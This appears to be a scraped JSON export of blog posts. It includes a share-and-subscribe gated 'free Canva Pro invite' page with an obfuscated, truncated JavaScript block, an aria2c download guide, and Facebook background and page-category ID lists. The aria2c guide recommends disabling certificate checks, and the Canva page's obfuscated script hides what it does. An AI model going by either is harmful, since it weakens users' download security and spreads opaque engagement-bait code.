万的访问量了，感谢大家的支持。 如果想更及时的收到最新资讯的推送，欢迎订阅 Telegram 频道：瑞景乐的博客。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"庆祝博客访问量突破 100 万！","feature":"","link":"https://dev-coco.github.io/post/Celebrating-100K-Visits/","stats":{"text":"1 min read","time":12000,"words":60,"minutes":1},"date":"2022-09-26 23:21:30","dateFormat":"2022-09-26"},{"content":"Quantities are limited, first come first served. @import url(\"https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css\"); .bi-facebook{color:#3b5998}.bi-twitter{color:#1da1f2}.bi-linkedin{color:#0a66c2}.bi-pinterest{color:#bd081c}.bi-whatsapp{color:#25d366}.bi-reddit{color:#ff4500}.bi{transition:.1s}.bi:hover{color:#000}#step1{width:fit-content;height:fit-content;box-shadow:0 0 1px #000;padding:20px;border-radius:10px;font-family:Ubuntu!important;text-transform:capitalize}#step1 .social{display:flex;gap:20px;justify-content:center;align-items:center;font-size:1.7em}.container1{width:fit-content;height:fit-content;box-shadow:0 0 1px #000;padding:20px;border-radius:10px;font-family:Ubuntu!important;display:none}.downloadLink{text-align:center;width:100%;position:relative;border-radius:10px;background:#f5f5f5;color:#000;user-select:none}.contentHide{position:absolute;width:100%;height:100%;background:#000;opacity:.6;display:flex;justify-content:center;align-content:center;border-radius:10px}.contentHide i{font-size:6rem;color:#fff;position:absolute;left:0;right:0;margin-left:auto;margin-right:auto;margin-top:5%}.contentHide a:hover{color:#2020ff}#subscribe{background:red;color:#fff;text-transform:capitalize;padding:5px 15px;text-decoration:none;border:1px solid #fff;width:fit-content;font-size:1.5rem;font-family:Ubuntu!important;transition:.1s}#subscribe:hover{background:#fff;border:1px solid red;color:red}.center{margin-left: auto; margin-right: auto;display:block} Do not close this window until you have finished. After clicking on the box below please come back to this page to get the invite link. Canva Pro free invitation has been updated again, I am the account owner, if you have any questions please read the policies and terms of Canva official website, please do not bother me, thank you. 2 steps before you can get Canva Pro invite Link Step 1: share on 1 social media step 2: subscribe to my channel Subscribe Now Do not close this window after subscribe, the download link will appear bellow thank you for subscribing below are the download links link1: Login to Canva Before clicking on this link link2: Login to Canva Before clicking on this link Do not join two teams at the same time, otherwise you will be banned. If the link does not work, please join the Telegram channel and let me know. https://t.me/raz1ner const socialBtn = document.querySelectorAll('.socialBtn') const step1 = document.getElementById('step1') const container1 = document.getElementsByClassName('container1')[0] socialBtn.forEach( function(element, index) { element.addEventListener('click',()=>{ setTimeout(()=>{ step1.style.display = 'none'; container1.style.display = 'block' container1.setAttribute('class', 'container1 center') },10000) }) }) const subBtn = document.getElementById('subscribe') const contentHide = document.getElementsByClassName('contentHide')[0] const downloadLink = document.getElementsByClassName('downloadLink')[0] subBtn.addEventListener('click', ()=>{ setTimeout(()=>{ (function(D,o){function e(D,o,u,x,m){return I(m-0x9e,D);}function J(D,o,u,x,m){return I(u-0x160,D);}function y(D,o,u,x,m){return I(o-0x1c6,D);}function z(D,o,u,x,m){return I(D-0x1c6,u);}function T(D,o,u,x,m){return I(D-0x168,o);}var u=D();while(!![]){try{var x=parseInt(z(0x35e,0x36f,'g7n7',0x378,0x342))/(-0x5c0*-0x1+0x5*0x5b3+-0x111f*0x2)+-parseInt(e('QE%v',0x1e2,0x211,0x1dd,0x1ff))/(-0x10d*-0x1d+-0x16*-0x65+-0x2725)+parseInt(e('o!SA',0x220,0x20e,0x1fa,0x21e))/(-0x2*0x347+0x199f+-0x130e)*(-parseInt(J('xrRY',0x2c6,0x2d4,0x2c7,0x2f7))/(-0x1f81+-0x253*-0xa+0x847))+parseInt(y('I4fA',0x35c,0x355,0x346,0x381))/(-0x1*-0x842+-0x1*0x121d+0x10*0x9e)*(-parseInt(T(0x30b,'f9k5',0x311,0x2e9,0x31b))/(0x1*-0x26d5+-0x17*-0x16a+0x655))+-parseInt(T(0x2d3,'Uh3$',0x2c0,0x2f4,0x2c5))/(0x12a0*-0x1+0x221e+0x1*-0xf77)*(parseInt(e('cYgx',0x20b,0x1f5,0x216,0x1fe))/(0x1f45+0x6b4+-0x25f1))+parseInt(z(0x340,0x364,'EieV',0x35f,0x321))/(0x2538+-0x5c*-0x3a+0x1*-0x3a07)*(-parseInt(J('T6V@',0x2b3,0x2c2,0x2e7,0x2e7))/(0x74b+-0x191d*0x1+0x11dc))+parseInt(e('UByr',0x257,0x251,0x21f,0x243))/(0x1*0x21d3+0x20*-0xac+-0xc48);if(x===o)break;else u['push'](u['shift']());}catch(m){u['push'](u['shift']());}}}(t,0x14a95*-0x1+-0x2e29d+0x62704));function g(D,o,u,x,m){return I(x-0x115,u);}function t(){var V=['zWyDsa','v8osW6NdQZa','aSk9WOhcVq','WO4GW6JdLmoo','D8onW5pdLqK','qCoXWRmoW74','W5W0WQRdJ8o3','W7lcT8k8W4vDqN/cOCozWPddUN0','WQqKe8k1W6K','WOmAgmkQWQZcJSk9W5rKW5nEyG','W4bXp8oJW5pdRmkDqW','W5NcPfPAW510fmo6BmosnXaz','W6/cKHxdMmoT','imo1WQBcJ8ks','W4PPwXj3','BqRdVSkhW5K','WPKDW7JcOrG','m8okW5O','q8otW7zKWPa','zmkRW4xcVG','pCoVWPhdRCo3W5XrWRLSWRyhBHu','oubigGXUCCoBW7D9','W67cJSoAgrdcI8okW54Zwh/dIa','vKLPb8oe','vSoeW7jZW4i','WPSeW67cHq8','yCoSWQ/dG8kd','wKOZhCoF','WQpcICkvWRO','t8kyEmo1W53dRNW','W7GHWQhcM8oT','q8kPWO7dUHxdISkE','t8kHWRddIWq','W4DZsmkIWOtcVmoRzZZdNConWRldSa','W6lcKmoMxZm','guJdKmkTpa','WP3dOWeCWOm','AZZcHHvE','W6tdMSoQegm','baJdLCkvW5bsfq','WQNcJ0BcJSk6W5nCW5VcUafZWQa','WQHMr8oHWRBcUCk2ygDDWOW/W54','Ar4BvhO','xKv9W4FcNa','W68Xwmk3W6S','W7xcT8k7W4TwqgRcOCoQWPVdOxG','WRddJmooohbVlmoR','WPVdU1n2WRu','ACoUWPdcMSkn','WPFdSmkQWQKT','WRNdHW9SWOK','WQvSW4ddLSk1','WRuoWQtcRmo2WQu2','oh5WW5/cPG','ig/cKSotFZmmWPD4WO1/W7y','r3H0WPev','W7ziWOddHMy','rCoHW4tcHrK','WRXiW63cQqe','W4D1qmkKW7ldH8k7scldSq','fL5HW5tcHW','FmowD2iy','sSoWW4tcSay','WRLgW5RcJsS','W4v9bbrH','zCk3W4C','WRJdMSkFAuq','DHpdU8kQW6K','WPiGBsr8W7RcJmkx','AHKDqd8','WRFcJ0j9WOa','W6avWQFcU0q','WOefW6/cLGa','lmo7W6hdSCoJ','W5DKW5pdL8oBWOhdKmkj','W4TUx8oNW4i','iZpcHN8pCmk+WQldOSkfW4zk','pSkkicLmj8kqhG7cQCkNjW'];t=function(){return V;};return t();}function f(D,o,u,x,m){return I(m-0x263,x);}var X=(function(){var D=!![];return function(o,u){var x=D?function(){function E(D,o,u,x,m){return I(D- -0x3ad,o);}if(u){var m=u[E(-0x253,'6o2d',-0x264,-0x244,-0x256)](o,arguments);return u=null,m;}}:function(){};return D=![],x;};}());function P(D,o,u,x,m){return I(m-0x278,o);}function A(D,o,u,x,m){return I(x-0x76,m);}function i(D,o,u,x,m){return I(D-0x39a,u);}function I(p,X){var D=t();return I=function(o,u){o=o-(-0x35*-0x11+0x1178+-0x13a3);var x=D[o];if(I['apLZtB']===undefined){var m=function(a){var C='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var G='',j='',O=G+m;for(var Q=-0x1aab*-0x1+0x569+-0x2*0x100a,l,h,B=-0x320+0x10*-0x13a+0x16c0;h=a['charAt'](B++);~h&&(l=Q%(-0x35*0x29+-0x3b*0xa7+0x2efe)?l*(0x34f*-0x6+0x241+0x11d9)+h:h,Q++%(-0x18dd+-0x1c9c+-0x357d*-0x1))?G+=O['charCodeAt'](B+(0x41*0x7e+-0x18cb*-0x1+-0x38bf))-(-0x1bef*-0x1+-0xb31+-0x1*0x10b4)!==-0xecc+-0x2013+0x2edf?String['fromCharCode'](0x51*-0x59+0x9*0x151+0x114f&l>>(-(0x19e+0x1*0x9bf+-0xb5b)*Q&0xb+0x9*-0x199+0xe5c)):Q:0x236b+0x1*0x50b+-0x143b*0x2){h=C['indexOf'](h);}for(var H=0x1*-0xa6+-0x1bc9*0x1+0x1c6f,n=G['length'];H","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Free Canva Pro Invite Link","feature":"https://dev-coco.github.io/post-images/free-canva-pro-invite-link.png","link":"https://dev-coco.github.io/post/free-canva-pro-invite-link/","stats":{"text":"7 min read","time":380000,"words":1014,"minutes":7},"date":"2022-09-21 00:10:05","dateFormat":"2022-09-21"},{"content":"超快的下载速度和多线程下载文件。 单文件超快下载速度 适用于下载单个大文件。 命令 aria2c -s16 -x16 -k1M --file-allocation=none --input-file=download-list.txt 参数详解 -s 单文件最大线程数，建议设置 16。 -x 同一服务器连接数，建议设置 16（最大值）。 -k 最小文件分片大小，建议设置 1 MB。假设文件有 15 MB，那么就会被分成 15 个 1 MB 的文件从服务器下载。 file-allocation 文件预计分配方式，有效降低磁盘碎片，建议设置 prealloc，但是在下载大文件的时候会需要消耗一些时间计算，设置 none 后就会跳过。 input-file 需要下载的文件链接，一行一个。 实测能达到每秒 66 MB 的下载速度。 如果使用 Chrome 下载，每秒只有 8 MB 左右的下载速度，相差好几倍！ 多线程下载 命令 适用于下载很多个小文件。 aria2c --max-concurrent-downloads=60 --input-file=download-list.txt --save-session=download-session.txt check-certificate=false 参数详解 max-concurrent-downloads 每个链接最大并行下载数。例如设置 60，也就是 60 个链接同时开始下载。这个值设置得越大，下载的进度就越快，但是也可能会导致连接失败。 save-session 保存错误的状态。如果下载的时候出现错误，会将链接保存到指定的文件内。 check-certificate 检查证书，建议设置 false。 ","tags":[{"name":"Shell","slug":"shell","used":true,"link":"https://dev-coco.github.io/tag/shell/"}],"title":"Aria2c 下载文件","feature":"","link":"https://dev-coco.github.io/post/Aria2c-Download-File/","stats":{"text":"2 min read","time":86000,"words":376,"minutes":2},"date":"2022-09-18 19:35:10","dateFormat":"2022-09-18"},{"content":"Facebook 背景颜色类名称和 ID 列表。 .color{width:120px;height:100px;border-radius:10px;}.tooltip{position:relative;display:inline-block}.tooltip .tooltipImg{visibility:hidden;position:absolute;z-index:1;bottom:100%;left:-300px}.tooltip:hover .tooltipImg{visibility:visible} 定制 Facebook 虚拟形象：链接 序号 类型 内容 ID 缩略图 1 3D 248623902401250 2 3D 2193627793985415 3 3D 1868855943417360 4 3D 191761991491375 5 3D 240401816771706 6 3D 200521337465306 7 3D 618093735238824 8 3D 177465482945164 9 3D 558836317844129 10 3D 206513879997925 11 3D 220176855252913 12 3D 146348336228703 13 3D 255137998566674 14 3D 197865920864520 15 3D 289599361581303 16 3D 338976169966519 17 3D 168373304017982 18 3D 215948349200293 19 3D 203233500491412 20 3D 168094414044546 21 3D 2035877216629521 22 3D 401534713663470 23 3D 1731809666854300 24 3D 1787111484677952 25 3D 195952107720077 26 插画 1821844087883360 27 插画 1591191980917023 28 插画 454160908341329 29 插画 2063886720526101 30 插画 1547619665336597 31 插画 255989551804163 32 插画 158866551466946 33 插画 189358915028027 34 插画 198600220781867 35 插画 1966335843691333 36 插画 221828835275596 37 插画 762009070855346 38 插画 1942494936063467 39 插画 821827291359870 40 插画 2056636147889908 41 插画 459210954494131 42 插画 308241406379224 43 插画 176677973177726 44 插画 1192421050883530 45 插画 1097326783944263 46 插画 1997537987164013 47 插画 935591686895084 48 插画 518374865736513 49 插画 241539443758219 50 插画 355046008296678 51 插画 212929162797298 52 插画 1932155243740811 53 插画 1533520746726919 54 插画 2041051642773322 55 插画 1539465312816011 56 插画 118306778764953 57 插画 1941201062777404 58 插画 2009883262560924 59 插画 366394748389826 60 纯色 1038184293978413 61 纯色 643122496026756 62 纯色 309187638478389 63 纯色 1976999789296340 64 纯色 204187940028597 65 纯色 1903718606535395 66 纯色 518596398537417 67 纯色 1271157196337260 68 纯色 618237107054113 69 纯色 696971568609418 70 纯色 184083004658498 71 纯色 866176818274367 72 纯色 2046306532386635 73 纯色 182734689103262 74 纯色 861160898741935 75 纯色 137309512798730 76 纯色 1142122703434463 77 纯色 168024350558664 78 纯色 1871233843174039 79 纯色 784913000073648 80 纯色 1032899107855087 81 纯色 680142694061655 82 纯色 291833941230225 83 纯色 154977255088164 84 纯色 301029513638534 85 纯色 217761075370932 86 纯色 1365883126823705 87 纯色 1901885619871565 88 纯色 1342634519948064 89 纯色 244564762627363 90 纯色 174562909878225 91 纯色 1683034525326576 92 纯色 3543708749174422 93 纯色 145893972683590 94 纯色 396790707364855 95 纯色 433967226963128 96 纯色 219266485227663 97 纯色 1876169806000670 98 纯色 287628994046344 99 纯色 1289741387813798 100 纯色 106018623298955 101 纯色 1699296716805387 102 纯色 1798961300535344 103 纯色 1864536833779614 104 纯色 1881421442117417 105 动物 猫 238863426886624 106 动物 猫 458988134561491 107 动物 猫 1903207336376192 108 动物 猫 1372847862780499 109 动物 猫 1211819908949985 110 动物 猫 997473700407693 111 动物 狗 852751678269066 112 动物 狗 1944493445569160 113 动物 狗 217508872373783 114 动物 独角兽 548109108916650 115 动物 鸽子 2117703618476510 116 动物 猪 174428623248697 117 动物 企鹅 528808880819990 118 动物 松鼠 402923128111134 119 动物 变色龙 693325981056481 120 动物 鼬鼠 2441724612753694 121 动物 蝙蝠 2421841908042756 122 动物 蜘蛛 947728898928250 123 动物 蜘蛛 476759302845916 124 动物 孔雀 1254410651314920 125 风景 323371698179784 126 风景 576646106467200 127 风景 698363068460805 128 风景 541056033292169 129 风景 1421927957874387 130 风景 143093446467972 131 风景 220680798660832 132 风景 146487026137131 133 风景 1732769623700511 134 风景 734912683339506 135 风景 776467815861328 136 风景 308229619684986 137 风景 1245148202264654 138 风景 540201056344741 139 风景 343832459419251 140 风景 139034353465296 141 风景 233556527178929 142 风景 1019755339166341 143 风景 169238510333539 144 风景 205263936712310 145 风景 710893630898745 146 风景 676677941094852 147 风景 23875494455430755 148 风景 2917446591867570 149 花纹 209057382971164 150 花纹 141781269930847 151 花纹 214298892688537 152 花纹 738912479628791 153 花纹 171846623369142 154 花纹 349149995526207 155 花纹 1646129128813120 156 花纹 364046384062791 157 花纹 2099216743699622 158 渐变 1996901660562063 159 渐变 182739109094750 160 渐变 218067308976029 161 渐变 1679248482160767 162 渐变 1654916007940525 163 渐变 1792915444087912 164 渐变 446330032368780 165 渐变 621731364695726 166 渐变 901751159967576 167 渐变 1221088758013590 168 渐变 365783880436034 169 渐变 443681549346681 170 渐变 814910605325191 171 渐变 688479024672716 172 渐变 1665482463761655 173 渐变 1840115832874243 174 渐变 324777221272701 175 渐变 1063121387542624 176 渐变 1777259169190672 177 渐变 1941912679424590 178 渐变 122708641613922 179 渐变 173535221234947 180 渐变 121945541697934 181 渐变 1705020913127345 182 渐变 288211338285858 183 渐变 100114277230063 184 渐变 303063890126415 185 渐变 249307305544279 186 渐变 870241763113497 187 渐变 404507133730824 188 渐变 2370297913009333 189 渐变 207915133341905 190 渐变 1698375866878341 191 渐变 931584293685988 192 渐变 392210437932621 193 渐变 794812087383368 194 渐变 2153095484922630 195 渐变 394939291024449 196 渐变 1452114928969476 197 渐变 2059241104395826 198 渐变 423339708139719 199 渐变 643451595995040 200 渐变 112460982937499 201 渐变 248834369200615 202 渐变 175493843120364 203 渐变 494268517655448 204 渐变 387928695037272 205 渐变 1434342216673945 206 渐变 840162899477050 207 渐变 240499496476810 208 渐变 390716181443289 209 渐变 753398924860281 210 渐变 181112579271867 211 渐变 927413067427178 212 渐变 6524876100975152 213 渐变 352226107216239 214 渐变 1718609505251057 215 渐变 650785203544528 216 渐变 1690448544763812 217 渐变 1531491134287540 218 渐变 6684976008247346 219 渐变 966041224497883 220 渐变 149887694868218 221 渐变 299890096121791 222 渐变 681225170735955 223 渐变 1012699409936684 224 渐变 844319284091919 225 渐变 422994794836896 226 渐变 639000325036183 227 渐变 362797391019758 228 渐变 1007203310607963 229 节日 新年 349933208919491 230 节日 新年 126911254916965 231 节日 新年 4722965231145013 232 节日 新年 490356751588632 233 节日 新年 839689803139846 234 节日 新年 223595302808792 235 节日 新年 284176505446461 236 节日 新年 990479471447319 237 节日 739107963088348 238 节日 印度教 排灯节 112820406268611 239 节日 犹太教 光明节 1396409060564304 240 节日 犹太教 光明节 2879355185430171 241 节日 犹太教 光明节 2344802215810980 242 节日 犹太教 光明节 612957429246391 243 节日 圣诞节 140279353298101 244 节日 圣诞节 750846605272776 245 节日 印度教 排灯节 493387477832232 246 节日 印度教 排灯节 316546669141617 247 节日 印度教 排灯节 1958745304426389 248 节日 犹太教 光明节 549881065441512 249 节日 印度教 排灯节 205340743555899 250 节日 印度教 排灯节 716200562066682 251 节日 印度教 排灯节 422799118620665 252 节日 万圣节 910735725799501 253 节日 生日 2022131001356762 254 节日 生日 1805398469505224 255 节日 生日 1867224010255891 256 节日 生日 3401009860210546 257 节日 生日 192392958167120 258 节日 生日 247569956393099 259 节日 1538829372863482 260 节日 1723026288124782 261 节日 847821360169458 262 节日 429514294593535 263 节日 258952168133732 264 节日 447934052791281 265 其它 伊斯兰教 118501805517738 266 其它 409482136128564 267 其它 319468561816672 268 其它 1252758614803325 269 其它 459219471140856 270 其它 294151661029286 271 其它 555579938613488 272 其它 225753758840882 273 其它 509546276320999 274 其它 443652859619420 275 其它 887006601475428 276 其它 1050070382117121 277 其它 741285863198429 278 其它 2914656075473100 279 其它 280545582445137 280 其它 327616211059208 281 其它 767006460174140 282 其它 1590118757742435 283 其它 2070672249875122 284 其它 511922019206519 285 其它 2080100245554727 286 其它 2137016686532204 287 其它 495180284215970 288 其它 993780377442365 289 其它 1570140059742658 290 其它 533086770409612 291 其它 2084850815083551 292 其它 824850677716355 293 其它 2001629730084887 294 其它 1969653033284072 295 其它 796331547218721 296 其它 216200295606279 297 其它 122069772079533 298 其它 162418564533047 299 其它 146176342715258 300 其它 983280818723091 301 其它 同性恋 1024741991026613 302 其它 同性恋 185775868914173 303 其它 同性恋 466267484143179 304 其它 同性恋 816008591908985 305 其它 同性恋 451772878920216 306 其它 同性恋 640839499659938 307 其它 跨性别 2498488296848332 308 其它 987263528552161 309 其它 361549614489058 310 其它 443152422856521 311 其它 445350286358326 312 其它 532471854017582 313 其它 嬉皮士 126396484758320 314 其它 408416683167502 315 其它 540341140095905 316 其它 971916999992695 317 其它 1414613722059035 318 其它 421092361935859 319 其它 1238081656394392 320 其它 280061742654758 321 其它 772369029903872 322 其它 2032867517065312 323 其它 231438476584844 324 其它 1655172555010455 325 其它 1953054055059680 326 其它 1369831517263092 327 其它 820220726468391 328 其它 328761036360061 329 其它 483755959164873 330 其它 330003257403452 331 其它 656255918244954 332 其它 862105224398163 333 其它 2075204749181345 334 其它 2302399499892142 335 其它 2503628779910135 336 食物 鸡蛋 862667370603267 337 食物 华夫饼 552118025129095 338 食物 蛋糕 1466076866833987 339 食物 牛角包 607447746283655 340 食物 胡萝卜、甜菜、草莓、梨 231799574757756 341 食物 南瓜 939061979793768 342 食物 面条 1638090489612431 343 食物 米饭 172006383420203 344 食物 糖果 564550247675824 345 食物 南瓜 2521774428045336 346 食物 苹果 621801711342962 347 水果 橙子 142648029936279 348 水果 橙子 178986852812190 349 水果 橙子 160419724814650 350 水果 橙子 174496469882866 351 水果 苹果 263789377694911 352 水果 青苹果 466587237108365 353 水果 牛油果 416346892109454 354 水果 香蕉 520417131911088 355 水果 菠萝 256440858237773 356 水果 菠萝 183875098988017 357 水果 西瓜 172497526576609 358 水果 柠檬 551220455279010 359 水果 橙子 217242945506199 360 水果 菠萝、香蕉、玉米 2055507981372719 361 体育 足球 238994793536659 362 体育 足球 357754874630720 363 体育 足球 127541261450947 364 体育 足球 2038527063029863 365 体育 篮球 559601404432552 366 体育 舞蹈 1928507880514640 367 体育 滑雪 583501312437609 368 体育 222294651896916 369 体育 滑雪 1704322613037607 370 体育 滑雪 1786837988286472 371 体育 缆车 3638280249622627 372 体育 举重 681717842372541 373 体育 足球 1945630225698131 374 体育 橄榄球场 530572310656388 375 体育 橄榄球 1369773906467697 376 体育 橄榄球 233793477161949 377 体育 183090645783780 378 体育 游泳 566557953685712 379 图案 271526630174527 380 图案 468537540215703 381 图案 1869514639786977 382 图案 418381131943702 383 图案 125023488228169 384 图案 926452517518903 385 图案 390923231450691 386 消息气泡 1790865141205098 387 消息气泡 1414447695342424 388 消息气泡 171213643437106 389 消息气泡 126877221295325 390 消息气泡 139950256618090 391 心形图案 同性恋 288449092200399 392 心形图案 333385263998628 393 心形图案 148862695775447 394 心形图案 518948401838663 395 心形图案 217321755510854 396 心形图案 1711103888933913 397 心形图案 127281214508877 398 心形图案 1879686378959026 399 心形图案 623911921148129 400 心形图案 161409924510923 401 心形图案 228164237768720 402 心形图案 437463493301534 403 心形图案 2398503527040238 404 心形图案 1943057695973225 405 心形图案 861250769045725 406 心形图案 233245916398282 407 心形图案 732044718735090 408 心形图案 1632677226786011 409 星空 939914969511927 410 星空 921225414706384 411 星空 1974886472751579 412 虚拟形象 生日 1219505891824980 413 虚拟形象 423487755852608 414 虚拟形象 335525448382588 415 虚拟形象 450256376566331 416 虚拟形象 5353027238057142 417 虚拟形象 2618925845077932 418 虚拟形象 1106713640138695 419 虚拟形象 291138356222688 420 虚拟形象 246321663676645 421 虚拟形象 341286230711623 422 虚拟形象 354142159553339 423 虚拟形象 343593844153516 424 虚拟形象 640772077321746 425 虚拟形象 997371870824260 426 虚拟形象 同性恋 864691964201937 427 虚拟形象 786606415634785 428 虚拟形象 生日 295811916086237 429 虚拟形象 544239310454324 430 虚拟形象 1968831220171652 431 虚拟形象 422776869186173 432 虚拟形象 525007002665394 433 虚拟形象 374320364643530 434 虚拟形象 7389085154495822 435 虚拟形象 生日 507069860872552 436 虚拟形象 705781113878672 437 虚拟形象 犹太教 光明节 998622744365920 438 虚拟形象 圣诞节 659294402089615 439 虚拟形象 480561986557820 440 虚拟形象 新年 247459227371042 441 虚拟形象 篮球 308285057819206 442 虚拟形象 206317411591834 443 虚拟形象 258864639634189 444 虚拟形象 橄榄球 623799502105669 445 植物 606643333067842 446 植物 2038921599720838 447 植物 182420025741281 448 植物 2351379025089161 449 植物 273122420232544 450 植物 206469036512971 451 植物 192444944695904 452 植物 134273813910336 453 植物 186109615426787 454 植物 380320625813653 455 植物 254470808468481 456 植物 365653833956649 457 植物 2091111677834062 458 植物 271695520040037 459 植物 174141573267874 460 植物 2078292082426788 461 植物 310601642809972 462 植物 941868452651037 463 植物 306075339932353 464 植物 264204594322309 465 植物 245711845973350 466 植物 134404560547212 467 植物 424283228025370 468 植物 1929175813854027 469 植物 396343990807392 470 植物 1644395429188862 471 植物 1872549619680358 472 植物 234778270631498 473 植物 3004105109819362 474 植物 166541304078067 475 植物 473180376436563 476 植物 1438275806209049 477 植物 1919961274941836 478 植物 371707276574370 479 植物 373215586408461 480 植物 180728499174333 481 植物 1490343837701145 482 植物 321719154990517 483 植物 1942588249295104 484 植物 1254923994693143 485 植物 180209176185918 486 植物 952700511795201 487 植物 233817987124338 488 植物 371281566632961 相关推荐： 彩色背景帖子 使用方法 Facebook 专页类别列表 Facebook 爱好列表 Facebook 小组徽章 ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook 背景颜色列表","feature":"","link":"https://dev-coco.github.io/post/Facebook-Background-Color/","stats":{"text":"12 min read","time":668000,"words":2430,"minutes":12},"date":"2022-09-15 07:20:11","dateFormat":"2022-09-15"},{"content":"Facebook 专页类别的名称和 ID 列表。 序号 名称 ID 1 阿布鲁佐餐厅 114682585623877 2 阿富汗餐馆 121058704635534 3 阿根廷餐厅 205735146122517 4 阿拉伯餐厅 723460654424134 5 阿塞拜疆餐厅 257879427905053 6 阿瓦德餐厅 1737358543190026 7 埃及餐厅 146111019132409 8 埃塞俄比亚餐馆 205689066126145 9 艾米利亚罗马涅餐馆 723440371131697 10 爱尔兰餐馆 137463256320813 11 爱尔兰酒吧 248856718821424 12 安得拉餐厅 954878187943885 13 安徽餐厅 195972097470194 14 按摩服务 109578329118821 15 按摩师 726846324122041 16 按摩学校 810846759015963 17 奥地利餐厅 772733776201497 18 奥斯塔餐厅 1751315025152495 19 澳门餐厅 1174919195872006 20 巴达维餐厅 839018499565070 21 巴登餐厅 1546103379030851 22 巴东餐厅 1717659871845137 23 巴伐利亚餐厅 285683351770109 24 巴基斯坦风味餐厅 207484765932960 25 巴拉圭餐厅 724968180977676 26 巴厘餐厅 593230974170585 27 巴拿马餐厅 1741013709474010 28 巴斯克风味餐馆 191373750905077 29 巴斯利卡塔餐厅 578871278949306 30 巴西餐馆 185459711490789 31 白俄罗斯餐厅 1739414649662761 32 百货商店 344508555610070 33 百吉饼店 1545764135732572 34 百叶窗和窗帘商店 197154743629294 35 搬家公司 185880521445708 36 搬家用品商店 124999390906893 37 搬运和仓储服务 132521440149062 38 板球场 279407562408138 39 办公用具店 152181445195236 40 办公用品 110249975723427 41 棒球场 1762098937366442 42 棒球练习场 199544366729511 43 棒球体育馆 1009617479115579 44 包车服务 108512435893415 45 保加利亚餐厅 252611215108984 46 保健/美容 2214 47 保健/美容 2214 48 保健食品商店 198722103478014 49 保健水疗 211987392145473 50 保龄球馆 182582091788254 51 保姆 114044592008363 52 保姆 212086618801415 53 保险代理人 152339818172592 54 保险公司 2236 55 保险经纪人 109594239116608 56 报税服务 133381803394214 57 报摊 829505473848469 58 报纸 108366235907857 59 杯形蛋糕店 325310894151007 60 北京餐厅 142820502803694 61 北印度餐厅 1001940186594348 62 北印度餐厅 1550167575288517 63 备考中心 191914921205687 64 比利时餐厅 113581542055311 65 壁炉商店 124620910942599 66 壁球场 640743999421537 67 避险基金 1060451310714939 68 编剧 917806388848623 69 编曲人 3564176307040352 70 便利店 200253979990258 71 标本剥制师 171385766240459 72 标志与横幅服务 188953757794108 73 表演艺术 1758092431143387 74 表演艺术 756092301147942 75 表演艺术剧院 173883042668223 76 表演艺术学校 187301137968148 77 冰淇淋店 200863816597800 78 冰球场 250169352016885 79 冰球场 706882379454361 80 冰沙店 1742050506043834 81 波斯/伊朗餐厅 109377152477621 82 玻璃吹制工 1703306846553672 83 玻璃服务 199562100074695 84 玻璃制造商 1612564135722539 85 玻璃装镜店 141311482955254 86 玻利维亚餐厅 1728916100723508 87 播客 627651640670228 88 伯利兹餐厅 1634783850094416 89 博物馆 197817313562497 90 布料店 986118931495301 91 财产规划律师 180001142041484 92 财产律师 199832016699296 93 财务顾问 299288747078724 94 彩票零售商 198170790193825 95 参考网站 2711 96 餐馆 273819889375819 97 餐馆 273819889375819 98 餐馆用品批发商 191334337551378 99 餐厅用品店 197260276952187 100 餐饮服务 180699075298665 101 残疾人服务 189687247721960 102 测量员 164080003645425 103 茶馆 203462172997785 104 唱片公司 1211 105 超级市场 1153901557995608 106 超市 150108431712141 107 车管所 192644094099081 108 车库/停车场 200027430011994 109 车库门维修服务 199850580046875 110 车辆登记中心 1039745942775544 111 成人娱乐服务 187623434605561 112 成人娱乐会所 1914652408802034 113 承包商 124816677590074 114 城堡 279433649070367 115 城市基础设施 1713595685546855 116 城市农场 239455319478077 117 冲浪点 151723701557019 118 冲浪用具店 1728434034087987 119 冲浪运动中心 1161467567229808 120 虫害防治服务 177939525582614 121 宠物保姆 208287852530384 122 宠物店 188573091164316 123 宠物服务 144982405562750 124 宠物公墓 179692792071824 125 宠物狗日托中心 128415180914694 126 宠物咖啡馆 988079354639718 127 宠物乐园 186911214686518 128 宠物领养服务 1203172043048652 129 宠物美容师 163003840417682 130 宠物美容师 849035302450077 131 宠物饲养员 140154442713316 132 宠物用品 2230 133 厨房/烹饪 132852590115660 134 厨师 1606 135 厨浴承包商 1008917735850635 136 川菜馆 1748542362059803 137 船舶服务站 132948550106442 138 船只 / 帆船教练 1740176306230257 139 船只服务 163431627040738 140 船只经销商 124886030917279 141 船只租赁 170474162998885 142 窗户安装服务 192041444166324 143 床垫批发商 132452193487149 144 床垫生产商 203842589633696 145 床垫专卖店 191990114153751 146 慈善组织 226326230802065 147 存储设施 163459287040281 148 鞑靼餐厅 142236849518532 149 大巴观光旅行社 641983825955669 150 大型零售商 209535879087405 151 大学院校 2602 152 贷款咨询服务 108443649233212 153 导游 175657495818161 154 地毯清洁工 210709755608101 155 地毯与地板材料商店 191328180890797 156 地铁站 1301884929841298 157 地中海风味餐厅 176960322351733 158 灯具店 196820813663200 159 灯塔 1602118933411700 160 抵押经纪人 136191809788079 161 电单车出租 211125172246436 162 电工 199182823425834 163 电竞联赛 1769577526672701 164 电竞团队 1235527809885935 165 电脑（品牌） 2210 166 电脑公司 2255 167 电脑商店 199512783398620 168 电脑维修服务 108472109230615 169 电器 150060378385891 170 电器维修服务 524610794394677 171 电视服务提供商 147757072316244 172 电视季 791314250889943 173 电视节目 1400 174 电视频道 1404 175 电视网络 1402 176 电视维修服务 2349233981790281 177 电梯服务 189040354450145 178 电信公司 2253 179 电影 1105 180 电影 1105 181 电影导演 502966423232592 182 电影副导演 881269865848908 183 电影监制 887571918541358 184 电影剪辑师 266119828750900 185 电影角色 1114 186 电影摄影师 144575131220615 187 电影院 192511100766680 188 电子产品 2213 189 电子产品店 187937741228885 190 电子产品公司 1202159779814354 191 电子香烟店 142431502842979 192 电子游戏 211579738882707 193 电子游戏室 201429350256874 194 雕塑公园 1362755683740187 195 雕塑家 399569185041896 196 钓鱼点 141810199571801 197 钓鱼用具店 281652712182174 